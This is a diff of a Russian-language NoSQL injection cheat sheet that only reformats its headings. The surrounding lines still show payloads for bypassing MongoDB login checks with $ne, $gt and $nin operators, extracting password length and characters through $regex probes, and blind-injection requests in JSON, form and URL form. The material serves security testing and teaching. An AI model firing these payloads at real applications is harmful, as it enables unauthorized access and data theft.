@@ -19,17 +19,17 @@
 # База про базы
 
 
-**Инструменты**
+# Инструменты
 
 *   [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) — автоматизированный инструмент для перечисления NoSQL-баз данных и эксплуатации веб-приложений.
 *   [digininja/nosqlilab](https://github.com/digininja/nosqlilab) — лабораторная среда для экспериментов с NoSQL-инъекциями.
 *   [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) — расширение для Burp Suite, позволяющее обнаруживать уязвимости NoSQL-инъекций.
 
-**Методология**
+# Методология
 
 > NoSQL-инъекция возникает, когда пользователь манипулирует запросами, внедряя вредоносный ввод в запрос к NoSQL-базе данных. В отличие от SQL-инъекций, NoSQL-инъекции часто используют JSON-запросы и операторы, такие как `$ne`, `$gt`, `$regex` или `$where` в MongoDB.
 
-### Инъекция операторов
+## Инъекция операторов
 
 | Оператор | Описание                      |
 | :------- | :---------------------------- |
@@ -53,7 +53,7 @@ db.products.find({ "price": { "$gt": 0 } })
 
 Вместо возврата конкретного товара база данных вернет все товары с ценой больше нуля, что приведет к утечке данных.
 
-### Обход аутентификации
+## Обход аутентификации
 
 Базовый обход аутентификации с использованием операторов "не равно" (`$ne`) или "больше" (`$gt`).
 
@@ -73,7 +73,7 @@ login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
 {"username": {"$gt":""}, "password": {"$gt":""}}
 ```
 
-### Извлечение информации о длине
+## Извлечение информации о длине
 
 Внедрите полезную нагрузку, используя оператор `$regex`. Инъекция сработает, если длина будет указана правильно.
 
@@ -82,7 +82,7 @@ username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
 ```
 
-### Извлечение информации о данных
+## Извлечение информации о данных
 
 **Извлечение данных с помощью оператора запроса `$regex`.**
 
@@ -107,7 +107,7 @@ username[$ne]=toto&password[$regex]=.{3}
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
 ```
 
-### Обход WAF и фильтров
+## Обход WAF и фильтров
 
 **Удаление предварительного условия:**
 
@@ -119,17 +119,17 @@ username[$ne]=toto&password[$regex]=.{3}
 
 # Слепые NoSQL-инъекции
 
-### POST с телом JSON:
+## POST с телом JSON:
 ```json
 {"username": {"$regex": "^admin$"}, "password": {"$regex": "^password$"}}
 ```
 
-### POST с телом в формате `application/x-www-form-urlencoded`
+## POST с телом в формате `application/x-www-form-urlencoded`
 ```
 username[$regex]=^admin$&password[$regex]=^password$
 ```
 
-### GET (передача параметров через URL)
+## GET 
 ```
 /?username[$regex]=^admin$&password[$regex]=^password$
 ```
